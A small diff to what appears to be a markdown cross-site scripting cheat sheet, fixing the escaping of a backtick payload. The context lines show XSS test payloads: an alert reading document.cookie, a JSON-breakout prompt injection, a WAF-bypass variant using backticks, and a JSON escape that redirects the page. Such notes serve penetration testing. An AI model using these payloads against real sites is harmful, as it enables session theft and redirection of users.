@@ -873,7 +873,7 @@ ${alert(document.cookie)}
 
 >Test escape out of the `JSON` data and inject test payload `"-prompt(321)-"` into the JSON content.
 
-If WAF blocks, use `"-alert\`1\`-"` changing parenthesis for backticks.
+If WAF blocks, use ``"-alert`1`-"`` changing parenthesis for backticks.
 
 Also, directly try to escape JSON with `"}; document.location="https://example.com/;//"`
 
